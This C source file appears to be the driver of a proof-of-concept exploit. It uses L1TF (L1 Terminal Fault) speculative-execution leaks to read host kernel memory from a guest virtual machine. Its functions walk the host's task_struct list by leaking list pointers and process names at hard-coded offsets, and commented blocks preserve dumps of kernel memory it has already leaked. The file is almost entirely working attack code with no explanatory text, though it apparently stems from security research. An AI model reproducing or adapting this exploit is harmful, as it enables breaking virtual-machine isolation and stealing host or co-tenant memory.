#include <assert.h>
#include <ctype.h>
#include <err.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>
#include "constants.h"
#include "helpers.h"
#include "hypercall.h"
#include "l1tf.h"
#include "spectre.h"
#include "util.h"
#include "timing.h"
#include "reverse.h"
#include "benchmark.h"

#define direct_map 0xffff934040000000

uintptr_t pa(uintptr_t va) {
	uintptr_t p = va - direct_map;
	assert(p < (1ULL << 40));
	return p;
}

int in_direct_map(uintptr_t va)
{
	return (va >> 40) == (direct_map >> 40);
}

#define OFF_PRIOS	0x64
#define OFF_TASKS	0x900
#define OFF_PID_LINKS	0xa78
#define OFF_COMM	0xc38

uintptr_t leak_task_struct(uintptr_t base, uintptr_t task_struct)
{
	const int verbose = 1;
	// char prios[0xc];
	// l1tf_leak(prios, base, pa(task_struct+OFF_PRIOS), sizeof(prios), repeats);
	// printf("prios:\n"); display(prios, sizeof(prios));

	char comm[0x10];
	l1tf_leak(comm, base, pa(task_struct+OFF_COMM), sizeof(comm));
	printf("comm:\n"); display(comm, sizeof(comm));

	printf("task_struct %16lx | comm ", task_struct);
	for (unsigned long i = 0; i < sizeof(comm); i++)
		printf("%c", isprint(comm[i]) ? comm[i] : '.');
	printf("\n");

	uintptr_t tasks_next = 0, tasks_prev = 0;
	do {
		l1tf_leak((char *)&tasks_next, base, pa(task_struct+OFF_TASKS), sizeof(tasks_next));
		if (in_direct_map(tasks_next))
			l1tf_leak((char *)&tasks_prev, base, pa(tasks_next+8), sizeof(tasks_prev));
		else
			tasks_prev = -1;
		if (verbose) printf("tasks_next %16lx,  tasks_prev %16lx (expected: %16lx)\n", tasks_next, tasks_prev, task_struct+OFF_TASKS);
	} while (tasks_prev != task_struct+OFF_TASKS);

	uintptr_t next_task_struct = tasks_next - OFF_TASKS;
	return next_task_struct;
}

uintptr_t leak_task_struct_backward(uintptr_t base, uintptr_t task_struct)
{
	const int verbose = 1;

	char comm[0x10];
	l1tf_leak(comm, base, pa(task_struct+OFF_COMM), sizeof(comm));
	printf("comm:\n"); display(comm, sizeof(comm));

	printf("task_struct %16lx | comm ", task_struct);
	for (unsigned long i = 0; i < sizeof(comm); i++)
		printf("%c", isprint(comm[i]) ? comm[i] : '.');
	printf("\n");

	uintptr_t tasks_prev = 0, tasks_next = 0;
	do {
		l1tf_leak((char *)&tasks_prev, base, pa(task_struct+OFF_TASKS+8), sizeof(tasks_prev));
		if (in_direct_map(tasks_prev))
			l1tf_leak((char *)&tasks_next, base, pa(tasks_prev), sizeof(tasks_next));
		else
			tasks_next = -1;
		if (verbose) printf("tasks_prev %16lx,  tasks_next %16lx (expected: %16lx)\n", tasks_prev, tasks_next, task_struct+OFF_TASKS);
	} while (tasks_next != task_struct+OFF_TASKS);

	uintptr_t prev_task_struct = tasks_prev - OFF_TASKS;
	return prev_task_struct;
}

int main(void)
{
	srand(time(0));
	set_cpu_affinity(CPU);
	l1tf_init();
	uintptr_t base = 0x88d43f218; // l1tf_find_base();
	uintptr_t own_task_struct = 0xffff936a91dba000;

	reverse_host_kernel_data_structures();
	exit(0);




	// uintptr_t first_task_struct = 0xffff93416c014a80-OFF_TASKS;
	// uintptr_t task_struct = first_task_struct;
	// do {
	// 	// task_struct = leak_task_struct(base, task_struct);
	// 	task_struct = leak_task_struct_backward(base, task_struct);
	// } while (task_struct != first_task_struct);




	// leak_task_struct(base, own_task_struct, 9);
	// uintptr_t task_prev = 0xffff93416c014a80-OFF_TASKS;
	// leak_task_struct(base, task_prev, 9);
	// uintptr_t task_prev_next = 0xffff934214810a40-OFF_TASKS;
	// leak_task_struct(base, task_prev_next, 9);
	// uintptr_t task_prev_prev = 0xffff93a1c66b2a80-OFF_TASKS;
	// leak_task_struct(base, task_prev_prev, 9);






	// char comm[16];
	// // l1tf_leak(comm, base, pa(task_struct+OFF_COMM), 0x10);
	// display(comm, 0x10);

	// char tasks[0x40];
	// l1tf_leak(tasks, base, pa(task_struct+OFF_TASKS-0x10), 0x40);
	// display(tasks, 0x40);
	//    0:                0 00 00 00 00 00 00 00 00 ........
	//    8:    248be3fe15218 18 52 e1 3f be 48 02 00 .R.?.H..
	//   10: ffffffff8501a440 40 a4 01 85 ff ff ff ff @.......
	//   18: ffff93416c014a80 80 4a 01 6c 41 93 ff ff .J.lA...
	//   20:        f0000008c 8c 00 00 00 0f 00 00 00 ........
	//   28: ffff936a91dba918 18 a9 db 91 6a 93 ff ff ....j...
	//   30: ffff936a91dba918 18 a9 db 91 6a 93 ff ff ....j...
	//   38:  fff936091dba928 28 a9 db 91 60 93 ff 0f (...`...


	// const int len_tasks_next = 0x20;
	// char tasks_next[len_tasks_next];
	// l1tf_leak_multi(tasks_next, base, pa(0xffff93416c014a80), len_tasks_next, 11);
	// display(tasks_next, len_tasks_next);
	//  0:  ffff934214810a40   40 0a 81 14 42 93 ff ff @...B...
	//  8:  ffff93a1c66b2a80   80 2a 6b c6 a1 93 ff ff .*k.....
	// 10:       f00000f008c   8c 00 0f 00 00 0f 00 00 ........
	// 18:  ffff93416c014a98   98 4a 01 6c 41 93 ff ff .J.lA...

	// char comm[16];
	// l1tf_leak_multi(comm, base, pa(0xffff93416c014a80-OFF_TASKS+OFF_COMM), sizeof(comm), 11);
	// display(comm, sizeof(comm));
	//    0:  6961775f6b736174   74 61 73 6b 5f 77 61 69 task_wai
	//    8:    7275650f726574   74 65 72 0f 65 75 72 00 ter.eur.

	// const int len = 0xc0;
	// char data[len];
	// l1tf_leak(data, base, pa(0xffff93416c014a80-OFF_TASKS), len);
	// display(data, len);

	return 0;
}
